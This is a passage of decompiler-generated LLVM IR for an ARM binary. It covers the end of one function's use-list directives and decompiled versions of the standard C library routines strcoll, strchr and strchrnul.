  uselistorder i32 %v0_20adc, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_20a3019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_209e0, { 2, 1, 0 }
  uselistorder i32 %v0_209e0, { 2, 0, 1 }
  uselistorder i32 %v2_209d8, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_209d8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_209d8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_20a3020, { 2, 1, 0 }
  uselistorder i32 %v11_209b4, { 1, 0 }
  uselistorder i32 %v7_209b4, { 1, 0 }
  uselistorder i32 %v1_20994, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_20994, { 1, 2, 0, 3 }
  uselistorder i32 %v2_20998, { 1, 0 }
  uselistorder i32 %v7_2098c, { 0, 2, 1 }
  uselistorder i32 %v10_20988, { 1, 0 }
  uselistorder i32 %v9_20980, { 1, 0, 2 }
  uselistorder i32 %v6_2097c, { 1, 0 }
  uselistorder i32 %v2_20974, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_20974, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_20984, { 0, 3, 2, 1 }
  uselistorder i32 %v7_20968, { 0, 2, 1 }
  uselistorder i32 %v13_20964, { 1, 0 }
  uselistorder i32 %v4_20960, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_20960, { 2, 0, 1 }
  uselistorder i32 %v6_20968, { 0, 3, 2, 1 }
  uselistorder i32 %v7_20958, { 0, 2, 1 }
  uselistorder i32 %v16_20954, { 1, 0 }
  uselistorder i32 %v4_20950, { 1, 2, 0 }
  uselistorder i32 %v0_20960.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_20958, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_20944, { 0, 3, 2, 1 }
  uselistorder i32 %v10_20940, { 1, 0 }
  uselistorder i32 %v1_2093c, { 1, 0 }
  uselistorder i32 %v10_20938, { 1, 0 }
  uselistorder i32 %v0_20938, { 3, 2, 1, 0 }
  uselistorder i32 %v0_2093c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_20930, { 0, 2, 1 }
  uselistorder i32 %v2_20924, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_20924, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_2093c37, { 1, 2, 0 }
  uselistorder i32 %v1_2091c, { 2, 1, 0 }
  uselistorder i32 %v1_20914, { 2, 3, 1, 0 }
  uselistorder i32 %v2_2090c, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_20908, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_20904, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_20904, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_208f4, { 0, 2, 1 }
  uselistorder i32 %v4_208f0, { 1, 0 }
  uselistorder i32 %v3_208e4, { 1, 0 }
  uselistorder i32 %v1_208dc, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_208d0, { 1, 0 }
  uselistorder i32 %v12_208cc, { 0, 2, 1 }
  uselistorder i32 %v8_208ac, { 1, 0, 2 }
  uselistorder i32 %v5_208ac, { 1, 0, 2 }
  uselistorder i32 %v2_208ac, { 1, 0, 2 }
  uselistorder i32 %v3_208a8, { 1, 0 }
  uselistorder i32 %v0_208ac, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_208cc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_20888, { 0, 2, 1 }
  uselistorder i32 %v4_20884, { 1, 0 }
  uselistorder i32 %v3_20878, { 1, 0 }
  uselistorder i32 %v1_20870, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_20864, { 1, 0 }
  uselistorder i32 %v12_20860, { 0, 2, 1 }
  uselistorder i32 %v8_20840, { 1, 0, 2 }
  uselistorder i32 %v5_20840, { 1, 0, 2 }
  uselistorder i32 %v2_20840, { 1, 0, 2 }
  uselistorder i32 %v3_2083c, { 1, 0 }
  uselistorder i32 %v0_20840, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_20860, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_2081c, { 0, 2, 1 }
  uselistorder i32 %v4_20818, { 1, 0 }
  uselistorder i32 %v3_2080c, { 1, 0 }
  uselistorder i32 %v1_20804, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_207f8, { 1, 0 }
  uselistorder i32 %v12_207f4, { 0, 2, 1 }
  uselistorder i32 %v8_207d4, { 1, 0, 2 }
  uselistorder i32 %v5_207d4, { 1, 0, 2 }
  uselistorder i32 %v2_207d4, { 1, 0, 2 }
  uselistorder i32 %v3_207d0, { 1, 0 }
  uselistorder i32 %v0_207d4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_207f4, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_20830, { 0, 2, 1 }
  uselistorder i32 %v1_2082c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_207b0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_207b0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_20834, { 1, 0, 3, 2 }
  uselistorder i32 %v0_208cc76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_207a4, { 1, 0 }
  uselistorder i32 %v0_207a4, { 3, 1, 0, 2 }
  uselistorder i32 %v2_2079c, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_2079c, { 1, 0, 2 }
  uselistorder i32 %v0_2079c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_208cc77, { 1, 0 }
  uselistorder i32 %v1_2077c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_20784, { 1, 0 }
  uselistorder i32 %v0_20758, { 3, 0, 1, 2 }
  uselistorder i32 %v1_2074c, { 1, 2, 0, 3 }
  uselistorder i32 %v5_20738, { 1, 0, 2 }
  uselistorder i32 %v1_20734, { 1, 0 }
  uselistorder i32 %v1_2072c, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_2072c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_20724, { 0, 2, 1 }
  uselistorder i32 %v3_20724, { 3, 0, 1, 2 }
  uselistorder i1 %v0_20724, { 1, 0 }
  uselistorder i1 %v1_20724, { 1, 0 }
  uselistorder i32 %v3_20720, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_20718, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_20704, { 1, 2, 0 }
  uselistorder i32 %v1_206fc, { 0, 2, 1 }
  uselistorder i32 %v12_206f8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_206ec, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_206f0, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_206e0, { 0, 2, 1 }
  uselistorder i32 %v1_206d8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_206d8, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_206d0, { 1, 0 }
  uselistorder i32 %v1_206c8, { 2, 1, 0 }
  uselistorder i32 %v2_206c0, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_206c0, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_206bc, { 2, 1, 0, 3 }
  uselistorder i32 %v2_206b0, { 1, 0 }
  uselistorder i32 %v1_206b0, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_206b0, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 9, 1, 2, 3, 10, 4, 5, 6, 11, 7, 8, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32* %r2.global-to-local, { 0, 31, 1, 2, 3, 4, 5, 32, 6, 7, 8, 9, 10, 33, 11, 12, 13, 14, 15, 34, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 35, 36, 68, 37, 38, 39, 40, 41, 69, 42, 43, 44, 45, 46, 70, 47, 48, 49, 50, 51, 71, 52, 53, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 72 }
  uselistorder i32* %r1.global-to-local, { 0, 3, 1, 15, 2, 4, 6, 8, 5, 16, 7, 9, 11, 13, 10, 17, 12, 14, 18, 23, 19, 20, 21, 22, 24, 25, 27, 26, 28, 29, 38, 30, 31, 39, 32, 40, 33, 41, 34, 35, 36, 37, 42, 45, 43, 55, 44, 46, 49, 47, 56, 48, 50, 53, 51, 57, 52, 54, 58, 59, 62, 60, 63, 61, 64, 65, 66, 67 }
  uselistorder i32* %r0.global-to-local, { 0, 22, 1, 2, 23, 3, 4, 24, 5, 6, 7, 8, 9, 10, 25, 11, 13, 12, 14, 15, 26, 16, 17, 27, 18, 19, 20, 21, 28, 29, 31, 30, 32, 33, 34 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 26, 18, 19, 20, 27, 21, 22, 23, 28, 24, 25, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 24, 25, 2, 26, 0, 27, 1, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 2, 24, 0, 25, 1, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 2, 27, 0, 28, 1, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 -12, { 2, 12, 13, 3, 15, 16, 4, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 22, 6, 0, 5, 1, 23, 24 }
  uselistorder i32 -32, { 3, 2, 4, 0, 1 }
  uselistorder i32 27, { 1, 0, 2 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -4, { 17, 61, 62, 63, 6, 18, 19, 20, 64, 65, 66, 7, 21, 22, 23, 67, 68, 69, 8, 24, 25, 70, 16, 15, 71, 72, 73, 14, 13, 12, 11, 26, 27, 28, 29, 30, 5, 31, 3, 32, 4, 74, 10, 33, 48, 49, 50, 9, 51, 52, 53, 34, 47, 2, 35, 41, 42, 43, 44, 45, 46, 0, 1, 54, 55, 56, 57, 58, 59, 60, 36, 37, 38, 39, 40 }
  uselistorder label %dec_label_pc_20b20, { 2, 0, 1 }
  uselistorder label %dec_label_pc_20ab4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_20a48, { 2, 0, 1 }
  uselistorder label %dec_label_pc_209e8, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_20974, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_20938, { 1, 0 }
  uselistorder label %dec_label_pc_20924, { 1, 0 }
  uselistorder label %dec_label_pc_208e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_20878, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2080c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_207ac, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_2077c, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_20718, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_206d8, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_20b44.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_20b44 = phi i32 [ %v0_20b44.pre, %bb ], [ %v5_20b44, %bb3 ]
  %v0_20b40 = phi i32 [ %tmp, %bb ], [ %v5_20b40, %bb3 ]
  %v1_20b40 = inttoptr i32 %v0_20b40 to i8*
  %v2_20b40 = load i8, i8* %v1_20b40, align 1
  %v1_20b44 = inttoptr i32 %v0_20b44 to i8*
  %v2_20b44 = load i8, i8* %v1_20b44, align 1
  %v3_20b44 = zext i8 %v2_20b44 to i32
  %v2_20b48 = icmp eq i8 %v2_20b40, 0
  br i1 %v2_20b48, label %.dec_label_pc_20b54_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_20b44 = add i32 %v0_20b44, 1
  %v5_20b40 = add i32 %v0_20b40, 1
  %v3_20b40 = zext i8 %v2_20b40 to i32
  %v10_20b4c = icmp eq i8 %v2_20b40, %v2_20b44
  br i1 %v10_20b4c, label %entry, label %dec_label_pc_20b54

.dec_label_pc_20b54_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_20b54

dec_label_pc_20b54:                               ; preds = %bb3, %.dec_label_pc_20b54_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_20b54_crit_edge ], [ %v3_20b40, %bb3 ]
  %v2_20b54.pre-phi = sub nsw i32 %.pn, %v3_20b44
  ret i32 %v2_20b54.pre-phi

; uselistorder directives
  uselistorder i8 %v2_20b40, { 0, 2, 1 }
  uselistorder i32 %v0_20b40, { 1, 0 }
  uselistorder i32 %v0_20b44, { 1, 0 }
  uselistorder label %dec_label_pc_20b54, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_20bc4 = urem i32 %arg1, 256
  %v0_20be43 = load i32, i32* @r0, align 4
  %v1_20be44 = urem i32 %v0_20be43, 4
  %v2_20be45 = icmp eq i32 %v1_20be44, 0
  br i1 %v2_20be45, label %dec_label_pc_20bec, label %dec_label_pc_20bcc

dec_label_pc_20bcc:                               ; preds = %entry, %dec_label_pc_20be0
  %v0_20be0 = phi i32 [ %v1_20be0, %dec_label_pc_20be0 ], [ %v0_20be43, %entry ]
  %v1_20bcc = inttoptr i32 %v0_20be0 to i8*
  %v2_20bcc = load i8, i8* %v1_20bcc, align 1
  %v3_20bcc = zext i8 %v2_20bcc to i32
  %v9_20bd0 = icmp eq i32 %v3_20bcc, %v1_20bc4
  br i1 %v9_20bd0, label %dec_label_pc_20ca0, label %dec_label_pc_20bd8

dec_label_pc_20bd8:                               ; preds = %dec_label_pc_20bcc
  %v2_20bd8 = icmp eq i8 %v2_20bcc, 0
  br i1 %v2_20bd8, label %dec_label_pc_20c9c, label %dec_label_pc_20be0

dec_label_pc_20be0:                               ; preds = %dec_label_pc_20bd8
  %v1_20be0 = add i32 %v0_20be0, 1
  %v1_20be4 = urem i32 %v1_20be0, 4
  %v2_20be4 = icmp eq i32 %v1_20be4, 0
  br i1 %v2_20be4, label %dec_label_pc_20bec, label %dec_label_pc_20bcc

dec_label_pc_20bec:                               ; preds = %dec_label_pc_20be0, %entry
  %v0_20bf0 = phi i32 [ %v0_20be43, %entry ], [ %v1_20be0, %dec_label_pc_20be0 ]
  %v4_20bec = mul nuw nsw i32 %v1_20bc4, 256
  %v5_20bec = or i32 %v4_20bec, %v1_20bc4
  %v4_20bf4 = mul i32 %v5_20bec, 65536
  %v5_20bf4 = or i32 %v4_20bf4, %v5_20bec
  br label %dec_label_pc_20bf8

dec_label_pc_20bf8:                               ; preds = %dec_label_pc_20c94, %dec_label_pc_20c34, %dec_label_pc_20bec
  %v0_20c5c = phi i32 [ %v0_20bf0, %dec_label_pc_20bec ], [ %v4_20bf8, %dec_label_pc_20c34 ], [ %v4_20bf8, %dec_label_pc_20c94 ]
  %v1_20bf8 = inttoptr i32 %v0_20c5c to i32*
  %v2_20bf8 = load i32, i32* %v1_20bf8, align 4
  %v4_20bf8 = add i32 %v0_20c5c, 4
  %v2_20c00 = xor i32 %v2_20bf8, %v5_20bf4
  %v2_20c0c = add i32 %v2_20bf8, 2130640639
  %v1_20c10 = sub i32 -1, %v2_20bf8
  %v2_20c14 = xor i32 %v2_20c0c, %v1_20c10
  %v2_20c20 = and i32 %v2_20c14, -2130640640
  store i32 %v2_20c20, i32* @r1, align 4
  %v2_20c28 = icmp eq i32 %v2_20c20, 0
  br i1 %v2_20c28, label %dec_label_pc_20c34, label %dec_label_pc_20c3c

dec_label_pc_20c34:                               ; preds = %dec_label_pc_20bf8
  %v2_20c04 = add i32 %v2_20c00, 2130640639
  %v1_20c1c = sub i32 -1, %v2_20c00
  %v2_20c24 = xor i32 %v2_20c04, %v1_20c1c
  %v2_20c2c = and i32 %v2_20c24, -2130640640
  %v2_20c34 = icmp eq i32 %v2_20c2c, 0
  br i1 %v2_20c34, label %dec_label_pc_20bf8, label %dec_label_pc_20c3c

dec_label_pc_20c3c:                               ; preds = %dec_label_pc_20bf8, %dec_label_pc_20c34
  %v2_20c3c = inttoptr i32 %v0_20c5c to i8*
  %v3_20c3c = load i8, i8* %v2_20c3c, align 1
  %v4_20c3c = zext i8 %v3_20c3c to i32
  %v9_20c40 = icmp eq i32 %v4_20c3c, %v1_20bc4
  br i1 %v9_20c40, label %dec_label_pc_20ca0, label %dec_label_pc_20c4c

dec_label_pc_20c4c:                               ; preds = %dec_label_pc_20c3c
  %v2_20c4c = icmp eq i8 %v3_20c3c, 0
  br i1 %v2_20c4c, label %dec_label_pc_20c9c, label %dec_label_pc_20c54

dec_label_pc_20c54:                               ; preds = %dec_label_pc_20c4c
  %v1_20c54 = add i32 %v0_20c5c, 1
  %v2_20c54 = inttoptr i32 %v1_20c54 to i8*
  %v3_20c54 = load i8, i8* %v2_20c54, align 1
  %v4_20c54 = zext i8 %v3_20c54 to i32
  %v9_20c58 = icmp eq i32 %v4_20c54, %v1_20bc4
  br i1 %v9_20c58, label %dec_label_pc_20ca0, label %dec_label_pc_20c64

dec_label_pc_20c64:                               ; preds = %dec_label_pc_20c54
  %v2_20c64 = icmp eq i8 %v3_20c54, 0
  br i1 %v2_20c64, label %dec_label_pc_20c9c, label %dec_label_pc_20c6c

dec_label_pc_20c6c:                               ; preds = %dec_label_pc_20c64
  %v1_20c6c = add i32 %v0_20c5c, 2
  %v2_20c6c = inttoptr i32 %v1_20c6c to i8*
  %v3_20c6c = load i8, i8* %v2_20c6c, align 1
  %v4_20c6c = zext i8 %v3_20c6c to i32
  %v9_20c70 = icmp eq i32 %v4_20c6c, %v1_20bc4
  br i1 %v9_20c70, label %dec_label_pc_20ca0, label %dec_label_pc_20c7c

dec_label_pc_20c7c:                               ; preds = %dec_label_pc_20c6c
  %v2_20c7c = icmp eq i8 %v3_20c6c, 0
  br i1 %v2_20c7c, label %dec_label_pc_20c9c, label %dec_label_pc_20c84

dec_label_pc_20c84:                               ; preds = %dec_label_pc_20c7c
  %v1_20c84 = add i32 %v0_20c5c, 3
  %v2_20c84 = inttoptr i32 %v1_20c84 to i8*
  %v3_20c84 = load i8, i8* %v2_20c84, align 1
  %v4_20c84 = zext i8 %v3_20c84 to i32
  %v9_20c88 = icmp eq i32 %v4_20c84, %v1_20bc4
  br i1 %v9_20c88, label %dec_label_pc_20ca0, label %dec_label_pc_20c94

dec_label_pc_20c94:                               ; preds = %dec_label_pc_20c84
  %v2_20c94 = icmp eq i8 %v3_20c84, 0
  br i1 %v2_20c94, label %dec_label_pc_20c9c, label %dec_label_pc_20bf8

dec_label_pc_20c9c:                               ; preds = %dec_label_pc_20bd8, %dec_label_pc_20c94, %dec_label_pc_20c7c, %dec_label_pc_20c64, %dec_label_pc_20c4c
  br label %dec_label_pc_20ca0

dec_label_pc_20ca0:                               ; preds = %dec_label_pc_20bcc, %dec_label_pc_20c84, %dec_label_pc_20c6c, %dec_label_pc_20c54, %dec_label_pc_20c3c, %dec_label_pc_20c9c
  %v1_20ca4 = phi i32 [ 0, %dec_label_pc_20c9c ], [ %v1_20c84, %dec_label_pc_20c84 ], [ %v1_20c6c, %dec_label_pc_20c6c ], [ %v1_20c54, %dec_label_pc_20c54 ], [ %v0_20c5c, %dec_label_pc_20c3c ], [ %v0_20be0, %dec_label_pc_20bcc ]
  ret i32 %v1_20ca4

; uselistorder directives
  uselistorder i32 %v4_20bf8, { 1, 0 }
  uselistorder i32 %v2_20bf8, { 0, 2, 1 }
  uselistorder i32 %v0_20c5c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_20bec, { 1, 0 }
  uselistorder i32 %v1_20be0, { 1, 0, 2 }
  uselistorder i32 %v0_20be43, { 2, 1, 0 }
  uselistorder i32 %v1_20bc4, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_20ca0, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_20c9c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_20c3c, { 1, 0 }
  uselistorder label %dec_label_pc_20bcc, { 1, 0 }
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_20cb4 = urem i32 %arg1, 256
  %v0_20cd42 = load i32, i32* @r0, align 4
  %v1_20cd43 = urem i32 %v0_20cd42, 4
  %v2_20cd44 = icmp eq i32 %v1_20cd43, 0
  br i1 %v2_20cd44, label %dec_label_pc_20cdc, label %dec_label_pc_20cbc

dec_label_pc_20cbc:                               ; preds = %entry, %dec_label_pc_20cd0
  %v0_20cd0 = phi i32 [ %v1_20cd0, %dec_label_pc_20cd0 ], [ %v0_20cd42, %entry ]
  %v1_20cbc = inttoptr i32 %v0_20cd0 to i8*
  %v2_20cbc = load i8, i8* %v1_20cbc, align 1
  %v3_20cbc = zext i8 %v2_20cbc to i32
  %v9_20cc0 = icmp eq i32 %v3_20cbc, %v1_20cb4
  br i1 %v9_20cc0, label %dec_label_pc_20d8c, label %dec_label_pc_20cc8

dec_label_pc_20cc8:                               ; preds = %dec_label_pc_20cbc
  %v2_20cc8 = icmp eq i8 %v2_20cbc, 0
  br i1 %v2_20cc8, label %dec_label_pc_20d8c, label %dec_label_pc_20cd0

dec_label_pc_20cd0:                               ; preds = %dec_label_pc_20cc8
  %v1_20cd0 = add i32 %v0_20cd0, 1
  %v1_20cd4 = urem i32 %v1_20cd0, 4
  %v2_20cd4 = icmp eq i32 %v1_20cd4, 0
  br i1 %v2_20cd4, label %dec_label_pc_20cdc, label %dec_label_pc_20cbc

dec_label_pc_20cdc:                               ; preds = %dec_label_pc_20cd0, %entry
  %v0_20ce0 = phi i32 [ %v0_20cd42, %entry ], [ %v1_20cd0, %dec_label_pc_20cd0 ]
  %v4_20cdc = mul nuw nsw i32 %v1_20cb4, 256
  %v5_20cdc = or i32 %v4_20cdc, %v1_20cb4
  %v4_20ce4 = mul i32 %v5_20cdc, 65536
  %v5_20ce4 = or i32 %v4_20ce4, %v5_20cdc
  br label %dec_label_pc_20ce8

dec_label_pc_20ce8:                               ; preds = %dec_label_pc_20d84, %dec_label_pc_20d24, %dec_label_pc_20cdc
  %v0_20d4c = phi i32 [ %v0_20ce0, %dec_label_pc_20cdc ], [ %v4_20ce8, %dec_label_pc_20d24 ], [ %v4_20ce8, %dec_label_pc_20d84 ]
  %v1_20ce8 = inttoptr i32 %v0_20d4c to i32*
  %v2_20ce8 = load i32, i32* %v1_20ce8, align 4
  %v4_20ce8 = add i32 %v0_20d4c, 4
  %v2_20cf0 = xor i32 %v2_20ce8, %v5_20ce4
  %v2_20cfc = add i32 %v2_20ce8, 2130640639
  %v1_20d00 = sub i32 -1, %v2_20ce8
  %v2_20d04 = xor i32 %v2_20cfc, %v1_20d00
  %v2_20d10 = and i32 %v2_20d04, -2130640640
  store i32 %v2_20d10, i32* @r1, align 4
  %v2_20d18 = icmp eq i32 %v2_20d10, 0
  br i1 %v2_20d18, label %dec_label_pc_20d24, label %dec_label_pc_20d2c

dec_label_pc_20d24:                               ; preds = %dec_label_pc_20ce8
  %v2_20cf4 = add i32 %v2_20cf0, 2130640639
  %v1_20d0c = sub i32 -1, %v2_20cf0
  %v2_20d14 = xor i32 %v2_20cf4, %v1_20d0c
  %v2_20d1c = and i32 %v2_20d14, -2130640640
  %v2_20d24 = icmp eq i32 %v2_20d1c, 0
  br i1 %v2_20d24, label %dec_label_pc_20ce8, label %dec_label_pc_20d2c

dec_label_pc_20d2c:                               ; preds = %dec_label_pc_20ce8, %dec_label_pc_20d24
  %v2_20d2c = inttoptr i32 %v0_20d4c to i8*
  %v3_20d2c = load i8, i8* %v2_20d2c, align 1
  %v4_20d2c = zext i8 %v3_20d2c to i32
  %v9_20d30 = icmp eq i32 %v4_20d2c, %v1_20cb4
  br i1 %v9_20d30, label %dec_label_pc_20d8c, label %dec_label_pc_20d3c

dec_label_pc_20d3c:                               ; preds = %dec_label_pc_20d2c
  %v2_20d3c = icmp eq i8 %v3_20d2c, 0
  br i1 %v2_20d3c, label %dec_label_pc_20d8c, label %dec_label_pc_20d44

dec_label_pc_20d44:                               ; preds = %dec_label_pc_20d3c
  %v1_20d44 = add i32 %v0_20d4c, 1
  %v2_20d44 = inttoptr i32 %v1_20d44 to i8*
  %v3_20d44 = load i8, i8* %v2_20d44, align 1
  %v4_20d44 = zext i8 %v3_20d44 to i32
  %v9_20d48 = icmp eq i32 %v4_20d44, %v1_20cb4
  br i1 %v9_20d48, label %dec_label_pc_20d8c, label %dec_label_pc_20d54

dec_label_pc_20d54:                               ; preds = %dec_label_pc_20d44
  %v2_20d54 = icmp eq i8 %v3_20d44, 0
  br i1 %v2_20d54, label %dec_label_pc_20d8c, label %dec_label_pc_20d5c

dec_label_pc_20d5c:                               ; preds = %dec_label_pc_20d54
  %v1_20d5c = add i32 %v0_20d4c, 2
  %v2_20d5c = inttoptr i32 %v1_20d5c to i8*
  %v3_20d5c = load i8, i8* %v2_20d5c, align 1
  %v4_20d5c = zext i8 %v3_20d5c to i32
  %v9_20d60 = icmp eq i32 %v4_20d5c, %v1_20cb4
  br i1 %v9_20d60, label %dec_label_pc_20d8c, label %dec_label_pc_20d6c

dec_label_pc_20d6c:                               ; preds = %dec_label_pc_20d5c
  %v2_20d6c = icmp eq i8 %v3_20d5c, 0
  br i1 %v2_20d6c, label %dec_label_pc_20d8c, label %dec_label_pc_20d74

dec_label_pc_20d74:                               ; preds = %dec_label_pc_20d6c
  %v1_20d74 = add i32 %v0_20d4c, 3
  %v2_20d74 = inttoptr i32 %v1_20d74 to i8*
  %v3_20d74 = load i8, i8* %v2_20d74, align 1
  %v4_20d74 = zext i8 %v3_20d74 to i32
  %v9_20d78 = icmp eq i32 %v4_20d74, %v1_20cb4
  br i1 %v9_20d78, label %dec_label_pc_20d8c, label %dec_label_pc_20d84

dec_label_pc_20d84:                               ; preds = %dec_label_pc_20d74
  %v2_20d84 = icmp eq i8 %v3_20d74, 0
  br i1 %v2_20d84, label %dec_label_pc_20d8c, label %dec_label_pc_20ce8

dec_label_pc_20d8c:                               ; preds = %dec_label_pc_20cc8, %dec_label_pc_20cbc, %dec_label_pc_20d84, %dec_label_pc_20d74, %dec_label_pc_20d6c, %dec_label_pc_20d5c, %dec_label_pc_20d54, %dec_label_pc_20d44, %dec_label_pc_20d3c, %dec_label_pc_20d2c
  %v1_20d90 = phi i32 [ %v1_20d74, %dec_label_pc_20d84 ], [ %v1_20d74, %dec_label_pc_20d74 ], [ %v1_20d5c, %dec_label_pc_20d6c ], [ %v1_20d5c, %dec_label_pc_20d5c ], [ %v1_20d44, %dec_label_pc_20d54 ], [ %v1_20d44, %dec_label_pc_20d44 ], [ %v0_20d4c, %dec_label_pc_20d3c ], [ %v0_20d4c, %dec_label_pc_20d2c ], [ %v0_20cd0, %dec_label_pc_20cbc ], [ %v0_20cd0, %dec_label_pc_20cc8 ]
  ret i32 %v1_20d90

; uselistorder directives
  uselistorder i32 %v4_20ce8, { 1, 0 }
  uselistorder i32 %v2_20ce8, { 0, 2, 1 }
  uselistorder i32 %v0_20d4c, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_20cdc, { 1, 0 }
  uselistorder i32 %v1_20cd0, { 1, 0, 2 }
  uselistorder i32 %v0_20cd42, { 2, 1, 0 }
  uselistorder i32 %v1_20cb4, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 2130640639, { 2, 0, 3, 1 }
